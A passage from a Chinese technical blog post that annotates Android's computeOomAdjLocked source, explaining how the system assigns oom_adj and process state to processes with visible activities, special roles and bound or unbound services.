class="comment">//依次轮询进程中的Activity</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; activitiesSize; j++) &#123;</span><br><span class="line">        final ActivityRecord r = app.activities.get(j);</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//如果进程包含可见Activity，即该进程是个可见进程</span></span><br><span class="line">        <span class="keyword">if</span> (r.visible) &#123;</span><br><span class="line">            <span class="keyword">if</span> (adj &gt; ProcessList.VISIBLE_APP_ADJ) &#123;</span><br><span class="line">                <span class="comment">//之前提到的正在处理广播、服务或测试的进程，adj为FOREGROUND，是小于VISIBLE_APP_ADJ</span></span><br><span class="line">                <span class="comment">//因此不会在此更新</span></span><br><span class="line">                adj = ProcessList.VISIBLE_APP_ADJ;</span><br><span class="line">                app.adjType = <span class="string">&quot;visible&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (procState &gt; PROCESS_STATE_CUR_TOP) &#123;</span><br><span class="line">                <span class="comment">//与oom_adj类似，在条件满足时，更新procState</span></span><br><span class="line">                procState = PROCESS_STATE_CUR_TOP;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//正在处理广播、服务或测试的进程，如果它们的调度策略为BACKGROUND</span></span><br><span class="line">            <span class="comment">//但又包含了可见Activity时，调度策略变更为DEFAULT</span></span><br><span class="line">            schedGroup = ProcessList.SCHED_GROUP_DEFAULT;</span><br><span class="line">            app.cached = <span class="literal">false</span>;</span><br><span class="line">            app.empty = <span class="literal">false</span>;</span><br><span class="line">            foregroundActivities = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (r.task != null &amp;&amp; minLayer &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                 final <span class="type">int</span> layer = r.task.mLayerRank;</span><br><span class="line">                 <span class="keyword">if</span> (layer &gt;= <span class="number">0</span> &amp;&amp; minLayer &gt; layer) &#123;</span><br><span class="line">                     <span class="comment">//更新ranklayer</span></span><br><span class="line">                     minLayer = layer;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//发现可见Activity时，直接可以结束循环</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (r.state == ActivityState.PAUSING || r.state == ActivityState.PAUSED) &#123;</span><br><span class="line">            <span class="comment">//如果进程包含处于PAUSING或PAUSED状态的Activity时</span></span><br><span class="line">            <span class="comment">//将其oom_adj调整为“用户可察觉”的的等级，这个等级还是很高的</span></span><br><span class="line">            <span class="keyword">if</span> (adj &gt; ProcessList.PERCEPTIBLE_APP_ADJ) &#123;</span><br><span class="line">                adj = ProcessList.PERCEPTIBLE_APP_ADJ;</span><br><span class="line">                app.adjType = <span class="string">&quot;pausing&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (procState &gt; PROCESS_STATE_CUR_TOP) &#123;</span><br><span class="line">                procState = PROCESS_STATE_CUR_TOP;</span><br><span class="line">            &#125;</span><br><span class="line">            schedGroup = ProcessList.SCHED_GROUP_DEFAULT;</span><br><span class="line">            app.cached = <span class="literal">false</span>;</span><br><span class="line">            app.empty = <span class="literal">false</span>;</span><br><span class="line">            foregroundActivities = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">//注意并不会break</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (r.state == ActivityState.STOPPING) &#123;</span><br><span class="line">            <span class="comment">//包含处于Stopping状态Activity的进程，其oom_adj也被置为PERCEPTIBLE_APP_ADJ</span></span><br><span class="line">            <span class="keyword">if</span> (adj &gt; ProcessList.PERCEPTIBLE_APP_ADJ) &#123;</span><br><span class="line">                adj = ProcessList.PERCEPTIBLE_APP_ADJ;</span><br><span class="line">                app.adjType = <span class="string">&quot;stopping&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">            <span class="comment">// 这种进程将被看作潜在的cached或empty进程</span></span><br><span class="line">            <span class="keyword">if</span> (!r.finishing) &#123;</span><br><span class="line">                <span class="keyword">if</span> (procState &gt; ActivityManager.PROCESS_STATE_LAST_ACTIVITY) &#123;</span><br><span class="line">                    procState = ActivityManager.PROCESS_STATE_LAST_ACTIVITY;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            app.cached = <span class="literal">false</span>;</span><br><span class="line">            app.empty = <span class="literal">false</span>;</span><br><span class="line">            foregroundActivities = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//只是含有cached-activity的进程，仅调整procState</span></span><br><span class="line">            <span class="keyword">if</span> (procState &gt; ActivityManager.PROCESS_STATE_CACHED_ACTIVITY) &#123;</span><br><span class="line">                procState = ActivityManager.PROCESS_STATE_CACHED_ACTIVITY;</span><br><span class="line">                app.adjType = <span class="string">&quot;cch-act&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (adj == ProcessList.VISIBLE_APP_ADJ) &#123;</span><br><span class="line">            <span class="comment">//不同可见进程的oom_adj有一定的差异，处在下层的oom_adj越大</span></span><br><span class="line">            <span class="comment">//即存在时间越长的Activity所在进程，重要性越低</span></span><br><span class="line">            adj += minLayer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>4.4 该部分代码主要用于处理一些特殊的进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (adj &gt; ProcessList.PERCEPTIBLE_APP_ADJ</span><br><span class="line">        || procState &gt; ActivityManager.PROCESS_STATE_FOREGROUND_SERVICE) &#123;</span><br><span class="line">    <span class="comment">//进程包含前台服务或被强制在前台运行时</span></span><br><span class="line">    <span class="comment">//oom_adj被调整为PERCEPTIBLE_APP_ADJ，只是procState略有不同</span></span><br><span class="line">    <span class="keyword">if</span> (app.foregroundServices) &#123;</span><br><span class="line">        adj = ProcessList.PERCEPTIBLE_APP_ADJ;</span><br><span class="line">        procState = ActivityManager.PROCESS_STATE_FOREGROUND_SERVICE;</span><br><span class="line">        app.cached = <span class="literal">false</span>;</span><br><span class="line">        app.adjType = <span class="string">&quot;fg-service&quot;</span>;</span><br><span class="line">        schedGroup = ProcessList.SCHED_GROUP_DEFAULT;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (app.forcingToForeground != null) &#123;</span><br><span class="line">        adj = ProcessList.PERCEPTIBLE_APP_ADJ;</span><br><span class="line">        procState = ActivityManager.PROCESS_STATE_IMPORTANT_FOREGROUND;</span><br><span class="line">        app.cached = <span class="literal">false</span>;</span><br><span class="line">        app.adjType = <span class="string">&quot;force-fg&quot;</span>;</span><br><span class="line">        app.adjSource = app.forcingToForeground;</span><br><span class="line">        schedGroup = ProcessList.SCHED_GROUP_DEFAULT;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//AMS的HeavyWeight进程单独处理</span></span><br><span class="line"><span class="keyword">if</span> (app == mHeavyWeightProcess) &#123;</span><br><span class="line">    <span class="keyword">if</span> (adj &gt; ProcessList.HEAVY_WEIGHT_APP_ADJ) &#123;</span><br><span class="line">        adj = ProcessList.HEAVY_WEIGHT_APP_ADJ;</span><br><span class="line">        schedGroup = ProcessList.SCHED_GROUP_BACKGROUND;</span><br><span class="line">        app.cached = <span class="literal">false</span>;</span><br><span class="line">        app.adjType = <span class="string">&quot;heavy&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (procState &gt; ActivityManager.PROCESS_STATE_HEAVY_WEIGHT) &#123;</span><br><span class="line">        procState = ActivityManager.PROCESS_STATE_HEAVY_WEIGHT;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//home进程特殊处理</span></span><br><span class="line"><span class="keyword">if</span> (app == mHomeProcess) &#123;</span><br><span class="line">    <span class="keyword">if</span> (adj &gt; ProcessList.HOME_APP_ADJ) &#123;</span><br><span class="line">        adj = ProcessList.HOME_APP_ADJ;</span><br><span class="line">        schedGroup = ProcessList.SCHED_GROUP_BACKGROUND;</span><br><span class="line"></span><br><span class="line">        app.cached = <span class="literal">false</span>;</span><br><span class="line">        app.adjType = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (procState &gt; ActivityManager.PROCESS_STATE_HOME) &#123;</span><br><span class="line">        procState = ActivityManager.PROCESS_STATE_HOME;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//前台进程之前的一个进程</span></span><br><span class="line"><span class="keyword">if</span> (app == mPreviousProcess &amp;&amp; app.activities.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (adj &gt; ProcessList.PREVIOUS_APP_ADJ) &#123;</span><br><span class="line">        adj = ProcessList.PREVIOUS_APP_ADJ;</span><br><span class="line">        schedGroup = ProcessList.SCHED_GROUP_BACKGROUND;</span><br><span class="line">        app.cached = <span class="literal">false</span>;</span><br><span class="line">        app.adjType = <span class="string">&quot;previous&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (procState &gt; ActivityManager.PROCESS_STATE_LAST_ACTIVITY) &#123;</span><br><span class="line">        procState = ActivityManager.PROCESS_STATE_LAST_ACTIVITY;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">app.adjSeq = mAdjSeq;</span><br><span class="line">app.curRawAdj = adj;</span><br><span class="line">app.hasStartedServices = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//处理正在进行backup工作的进程</span></span><br><span class="line"><span class="keyword">if</span> (mBackupTarget != null &amp;&amp; app == mBackupTarget.app) &#123;</span><br><span class="line">    <span class="keyword">if</span> (adj &gt; ProcessList.BACKUP_APP_ADJ) &#123;</span><br><span class="line">        ...</span><br><span class="line">        adj = ProcessList.BACKUP_APP_ADJ;</span><br><span class="line">        <span class="keyword">if</span> (procState &gt; ActivityManager.PROCESS_STATE_IMPORTANT_BACKGROUND) &#123;</span><br><span class="line">            procState = ActivityManager.PROCESS_STATE_IMPORTANT_BACKGROUND;</span><br><span class="line">        &#125;</span><br><span class="line">        app.adjType = <span class="string">&quot;backup&quot;</span>;</span><br><span class="line">        app.cached = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>至此，我们可以看出 computeOomAdjLocked 处理一个进程时，按照重要性由高到低的顺序，逐步判断该进程是否满足对应的条件。尽管计算一个进程的 oom_adj 时会经过上述所有的判断，但当一个进程已经满足重要性较高的条件时，后续的判断实际上不会更改它已经获得的 oom_adj。上述代码的逻辑图如下所示：</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202205141709842.png" alt="image-20220514170953732"></p><p>4.5  该部分代码主要是处理包含服务的进程，进一步分段说明。</p><p>4.5.1 Unbounded Service 的处理</p><p>当进程中包含 Unbounded Service 时，进程的 oom_adj 先按照 Unbounded Service 的处理方式进行调整。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">//依次处理进程中的每一个Service</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> is = app.services.size()<span class="number">-1</span>;</span><br><span class="line">    is &gt;= <span class="number">0</span> &amp;&amp; (adj &gt; ProcessList.FOREGROUND_APP_ADJ</span><br><span class="line">            || schedGroup == ProcessList.SCHED_GROUP_BACKGROUND</span><br><span class="line">            || procState &gt; ActivityManager.PROCESS_STATE_TOP);</span><br><span class="line">    is--) &#123;</span><br><span class="line">    ServiceRecord s = app.services.valueAt(is);</span><br><span class="line">    <span class="comment">//Service被已Unbounded Service的方式启动过</span></span><br><span class="line">    <span class="keyword">if</span> (s.startRequested) &#123;</span><br><span class="line">        app.hasStartedServices = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">//调整procState</span></span><br><span class="line">        <span class="keyword">if</span> (procState &gt; ActivityManager.PROCESS_STATE_SERVICE) &#123;</span><br><span class="line">            procState = ActivityManager.PROCESS_STATE_SERVICE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (app.hasShownUi &amp;&amp; app != mHomeProcess) &#123;</span><br><span class="line">            <span class="comment">// 仅有含有服务且显示过UI的进程，由于其占用内存可能较多，因此需要尽早回收</span></span><br><span class="line">            <span class="comment">// 故此处不调整其oom_adj</span></span><br><span class="line">            <span class="keyword">if</span> (adj &gt; ProcessList.SERVICE_ADJ) &#123;</span><br><span class="line">                app.adjType = <span class="string">&quot;cch-started-ui-services&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (now &lt; (s.lastActivity + ActiveServices.MAX_SERVICE_INACTIVITY)) &#123;</span><br><span class="line">                <span class="comment">//MAX_SERVICE_INACTIVITY为activity启动service后，系统最多保留Service的时间</span></span><br><span class="line">                <span class="comment">//此时进程的oom_adj就可以被调整为后台服务对应的SERVICE_ADJ</span></span><br><span class="line">                <span class="comment">//adj大于500的进程均会受此判断的影响</span></span><br><span class="line">                <span class="keyword">if</span> (adj &gt; ProcessList.SERVICE_ADJ) &#123;</span><br><span class="line">                    adj = ProcessList.SERVICE_ADJ;</span><br><span class="line">                    app.adjType = <span class="string">&quot;started-services&quot;</span>;</span><br><span class="line">                    app.cached = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//处理Service存在超时的情况，可见超时时也不会调整oom_adj</span></span><br><span class="line">            <span class="keyword">if</span> (adj &gt; ProcessList.SERVICE_ADJ) &#123;</span><br><span class="line">                app.adjType = <span class="string">&quot;cch-started-services&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>从上述代码可以看出，当进程中含有 Unbounded Service 时，如果进程之前没有启动过 UI，且 Unbounded Service 存活的时间没有超时，进程的 oom_adj 才能被调整为 SERVICE_ADJ；否则进程的 oom_adj 仍然是 UNKNOW_ADJ 或其他大于 500 的值。</p><p>4.5.2 Bounded Service 的处理</p><p>该部分代码表示进程按照 Unbounded Service 的方式调增 oom_adj，然后再按照 Bouneded Service 的方式进一步调整。若 Service 仅为 Unbounded Service 或 Bounded Service 中的一种时，computeOomAdjLocked 函数的第五部分只会按照一种方式调增 oom_adj。Bounded Service 的处理方式，远比 Unbounded Service 复杂，依赖于客户端的 oom_adj 和绑定服务时使用的 flag。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="comment">//如果该Service还被客户端Bounded，即是Bounded Service时</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> conni = s.connections.size()<span class="number">-1</span>;</span><br><span class="line">            conni &gt;= <span class="number">0</span> &amp;&amp; (adj &gt; ProcessList.FOREGROUND_APP_ADJ</span><br><span class="line">                    || schedGroup == ProcessList.SCHED_GROUP_BACKGROUND</span><br><span class="line">                    || procState &gt; ActivityManager.PROCESS_STATE_TOP);</span><br><span class="line">            conni--) &#123;</span><br><span class="line">        ArrayList&lt;ConnectionRecord&gt; clist = s.connections.valueAt(conni);</span><br><span class="line">        <span class="comment">//客户端可以通过一个Connection以不同的参数绑定Service</span></span><br><span class="line">        <span class="comment">//因此，一个Service可以对应多个Connection，一个Connection又对应多个ConnectionRecord</span></span><br><span class="line">        <span class="comment">//这里依次处理每一个ConnectionRecord</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">                i &lt; clist.size() &amp;&amp; (adj &gt; ProcessList.FOREGROUND_APP_ADJ</span><br><span class="line">                        || schedGroup == ProcessList.SCHED_GROUP_BACKGROUND</span><br><span class="line">                        || procState &gt; ActivityManager.PROCESS_STATE_TOP);</span><br><span class="line">                i++) &#123;</span><br><span class="line">            ConnectionRecord cr = clist.get(i);</span><br><span class="line">            <span class="keyword">if</span> (cr.binding.client == app) &#123;</span><br><span class="line">                <span class="comment">// Binding to ourself is not interesting.</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//当BIND_WAIVE_PRIORITY为1时，客户端就不会影响服务端</span></span><br><span class="line">            <span class="comment">//if中的流程就可以略去；否则，客户端就会影响服务端</span></span><br><span class="line">            <span class="keyword">if</span> ((cr.flags&amp;Context.BIND_WAIVE_PRIORITY) == <span class="number">0</span>) &#123;</span><br><span class="line">                ProcessRecord client = cr.binding.client;</span><br><span class="line">                <span class="comment">//计算出客户端进程的oom_adj</span></span><br><span class="line">                <span class="comment">//由此可看出Android oom_adj的计算多么麻烦</span></span><br><span class="line">                <span class="comment">//要是客户端进程中，又有个服务进程被绑定，那么将再计算其客户端进程的oom_adj</span></span><br><span class="line">                <span class="type">int</span> clientAdj = computeOomAdjLocked(client, cachedAdj,</span><br><span class="line">                        TOP_APP, doingAll, now);</span><br><span class="line">                <span class="type">int</span> clientProcState = client.curProcState;</span><br><span class="line">                <span class="keyword">if</span> (clientProcState &gt;= ActivityManager.PROCESS_STATE_CACHED_ACTIVITY) &#123;</span><br><span class="line">                    clientProcState = ActivityManager.PROCESS_STATE_CACHED_EMPTY;</span><br><span class="line">                &#125;</span><br><span class="line">                String adjType = null;</span><br><span class="line">                <span class="comment">//BIND_ALLOW_OOM_MANAGEMENT置为1时，先按照通常的处理方式，调整服务端进程的adjType</span></span><br><span class="line">                <span class="keyword">if</span> ((cr.flags&amp;Context.BIND_ALLOW_OOM_MANAGEMENT) != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">//与前面分析Unbounded Service基本一致，若进程显示过UI或Service超时</span></span><br><span class="line">                    <span class="comment">//会将clientAdj修改为当前进程的adj，即不需要考虑客户端进程了</span></span><br><span class="line">                    <span class="keyword">if</span> (app.hasShownUi &amp;&amp; app != mHomeProcess) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (adj &gt; clientAdj) &#123;</span><br><span class="line">                            adjType = <span class="string">&quot;cch-bound-ui-services&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        app.cached = <span class="literal">false</span>;</span><br><span class="line">                        clientAdj = adj;</span><br><span class="line">                        clientProcState = procState;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (now &gt;= (s.lastActivity</span><br><span class="line">                                + ActiveServices.MAX_SERVICE_INACTIVITY)) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (adj &gt; clientAdj) &#123;</span><br><span class="line">                                adjType = <span class="string">&quot;cch-bound-services&quot;</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            clientAdj = adj;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//根据情况，按照clientAdj调整当前进程的adj</span></span><br><span class="line">                <span class="keyword">if</span> (adj &gt; clientAdj) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (app.hasShownUi &amp;&amp; app != mHomeProcess</span><br><span class="line">                            &amp;&amp; clientAdj &gt; ProcessList.PERCEPTIBLE_APP_ADJ) &#123;</span><br><span class="line">                        adjType = <span class="string">&quot;cch-bound-ui-services&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//以下的流程表明，client和flag将同时影响Service进程的adj</span></span><br><span class="line">                        <span class="keyword">if</span> ((cr.flags&amp;(Context.BIND_ABOVE_CLIENT</span><br><span class="line">                                |Context.BIND_IMPORTANT)) != <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="comment">//从这里再次可以看出，Service重要性小于等于Client</span></span><br><span class="line">                            adj = clientAdj &gt;= ProcessList.PERSISTENT_SERVICE_ADJ</span><br><span class="line">                                    ? clientAdj : ProcessList.PERSISTENT_SERVICE_ADJ;</span><br><span class="line">                        <span class="comment">//BIND_NOT_VISIBLE表示不将服务端当作visible进程看待</span></span><br><span class="line">                        <span class="comment">//于是，即使客户端的adj小于PERCEPTIBLE_APP_ADJ，service也只能取到PERCEPTIBLE_APP_ADJ</span></span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((cr.flags&amp;Context.BIND_NOT_VISIBLE) != <span class="number">0</span></span><br><span class="line">                                &amp;&amp; clientAdj &lt; ProcessList.PERCEPTIBLE_APP_ADJ</span><br><span class="line">                                &amp;&amp; adj &gt; ProcessList.PERCEPTIBLE_APP_ADJ) &#123;</span><br><span class="line">                            adj = ProcessList.PERCEPTIBLE_APP_ADJ;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clientAdj &gt;= ProcessList.PERCEPTIBLE_APP_ADJ) &#123;</span><br><span class="line">                            adj = clientAdj;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (adj &gt; ProcessList.VISIBLE_APP_ADJ) &#123;</span><br><span class="line">                                adj = Math.max(clientAdj, ProcessList.VISIBLE_APP_ADJ);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                <span class="keyword">if</span> ((cr.flags&amp;Context.BIND_NOT_FOREGROUND) == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">//进一步更具client调整当前进程的procState、schedGroup等</span></span><br><span class="line">                    ...</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    ...</span><br><span class="line">                &#125;</span><br><span class="line">                ...</span><br><span class="line">                <span class="keyword">if</span> (procState &gt; clientProcState) &#123;</span><br><span class="line">                    procState = clientProcState;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//其它参数的赋值</span></span><br><span class="line">                ...</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span> ((cr.flags&amp;Context.BIND_TREAT_LIKE_ACTIVITY) != <span class="number">0</span>) &#123;</span><br><span class="line">                app.treatLikeActivity = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//取出ConnectionRecord所在的Activity</span></span><br><span class="line">            final ActivityRecord a = cr.activity;</span><br><span class="line">            <span class="comment">//BIND_ADJUST_WITH_ACTIVITY值为1时，表示服务端可以根据客户端Activity的oom_adj作出相应的调整</span></span><br><span class="line">            <span class="keyword">if</span> ((cr.flags&amp;Context.BIND_ADJUST_WITH_ACTIVITY) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (a != null &amp;&amp; adj &gt; ProcessList.FOREGROUND_APP_ADJ &amp;&amp;</span><br><span class="line">                        (a.visible || a.state == ActivityState.RESUMED ||</span><br><span class="line">                                a.state == ActivityState.PAUSING)) &#123;</span><br><span class="line">                <span class="comment">//BIND_ADJUST_WITH_ACTIVITY置为1，且绑定的activity可见或在前台时，</span></span><br><span class="line">                <span class="comment">//Service进程的oom_adj可以变为FOREGROUND_APP_ADJ</span></span><br><span class="line">                adj = ProcessList.FOREGROUND_APP_ADJ;</span><br><span class="line">              <span class="comment">//BIND_NOT_FOREGROUND为0时，才准许调整Service进程的调度优先级</span></span><br><span class="line">                <span class="keyword">if</span> ((cr.flags&amp;Context.BIND_NOT_FOREGROUND) == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((cr.flags&amp;Context.BIND_IMPORTANT) != <span class="number">0</span>) &#123;</span><br><span class="line">                        schedGroup = ProcessList.SCHED_GROUP_TOP_APP;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        schedGroup = ProcessList.SCHED_GROUP_DEFAULT;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//改变其它参数</span></span><br><span class="line">                app.cached = <span class="literal">false</span>;</span><br><span class="line">                app.adjType = <span class="string">&quot;service&quot;</span>;</span><br><span class="line">                app.adjTypeCode = ActivityManager.RunningAppProcessInfo</span><br><span class="line">                        .REASON_SERVICE_IN_USE;</span><br><span class="line">                app.adjSource = a;</span><br><span class="line">                app.adjSourceProcState = procState;</span><br><span class="line">                app.adjTarget = s.name;</span><br><span class="line">            